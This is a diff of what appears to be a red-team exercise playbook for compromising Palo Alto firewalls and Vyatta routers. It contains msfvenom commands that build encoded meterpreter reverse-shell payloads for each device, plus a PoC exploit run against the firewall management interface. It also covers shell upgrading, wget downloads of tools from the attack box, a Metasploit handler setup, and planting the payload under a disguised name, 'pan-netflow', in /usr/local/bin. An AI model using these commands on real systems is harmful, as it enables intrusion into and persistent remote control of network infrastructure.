@@ -254,23 +254,56 @@ KG+Vs7e5$dF4
 
 ### Metasploit Payload Setup
 Target all Networking Devices and drop a payload that creates a meterpreter session on each of them:
-Make the Payload file for The Palo:
-On your attack box, in the same directory where you saved your scripts, run the following Command. This saves the payload to a file called `netflow.palo` .
+Make the Payload files for each of your machines:
+On your attack box, in the same directory where you saved your scripts, run the following Command. This saves the payload to a file called.
 
+Palo Alto - Orange Firewall
 ``` bash
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=9729 -f elf > netflow.palo
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your Attacker Box> LPORT=50180 -e x86/shikata_ga_nai -i 3 -f elf > pan-netflow
+
 ```
 
-Next, make the payload file for the vyatta routers:
-In the same directory on your Attack box, run the following command. The payload will be saved to a file called `netflow.vyatta` .
-
+Vyatta- Orange Edge Router
 ```bash
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=6342 -f elf > netflow.vyatta
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACK BOX IP> LPORT=50180 -e x86/shikata_ga_nai -i 3 -f elf > vyosedge-netflow
+
 ```
 
-Make the two files executable
+
+Vyatta- Orange Core Router
 ```bash
-chmod +x netflow.palo netflow.vyatta
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Edge Router connected Interaface (1.33.XXX.1)> LPORT=50180 -e x86/shikata_ga_nai -i 3 -f elf > vyoscore-netflow
+
+```
+
+
+Vyatta- Orange 1st Floor
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Edge Router connected Interaface (1.33.XXX.1)> LPORT=50180 -e x86/shikata_ga_nai -i 3 -f elf > vyos1fl-netflow
+
+```
+
+
+Vyatta- Orange 2nd Floor
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Core Router IP(172.20.XXX.13)> LPORT=50100 -e x64/xor -i 5 -f elf > vyos2fl-netflow
+
+```
+
+
+
+Vyatta- Orange OT Router
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Core Router IP(172.20.XXX.17)> LPORT=50190 x64/xor -i 5 -f elf > vyosot-netflow
+
+```
+
+
+
+Palo Alto- Orange OT Palo
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<OT Router IP(172.20.XXX.1)> LPORT=50189 -e x86/shikata_ga_nai -i 3 -f elf > pan-netflow
+
 ```
 
 
@@ -318,7 +351,7 @@ python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_bo
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
-
+***NOTE- UPGRADING SHELL WILL GENERATE A LOG AND YOUR SESSION WILL BE DOCUMENTED
 
 Troubleshooting steps:
 
@@ -339,8 +372,6 @@ Troubleshooting steps:
    - (response should be "root")
 
 ```bash
-whoami
-id
 bash 
 pwd
 cd ~
@@ -351,6 +382,7 @@ ls
 The following command pulls the files and puts them into the current users home directory.
    ```bash
       wget -r -np -nH --cut-dirs=1 -P ~ http://<IP_of_your_attack_box>:51855/
+      chmod +x ./*
    ```
  3. cd to current users home directory: `cd ~`
    make pan_os_comm executable: `chmod +x pan_os_comm`
@@ -528,7 +560,7 @@ In one of your empty terminals on your attack box
 2. set up your multi handler to catch the palo alto payload
 ``` 
 use exploit/multi/handler  
-set PAYLOAD linux/x86/meterpreter/reverse_tcp (for the Palo) 
+set PAYLOAD linux/x86/meterpreter/reverse_tcp 
 set LHOST <Your_Attacker_IP> 
 set LPORT 50189 
 set ExitOnSession false
@@ -540,7 +572,6 @@ exploit -j`
 In the terminal that has your beacon shell (palo alto callback)
  ```
  cd ~
- chmod +x pan-netflow
  mv pan-netflow /usr/local/bin/pan-netflow
  ```
  cd to where the file is  
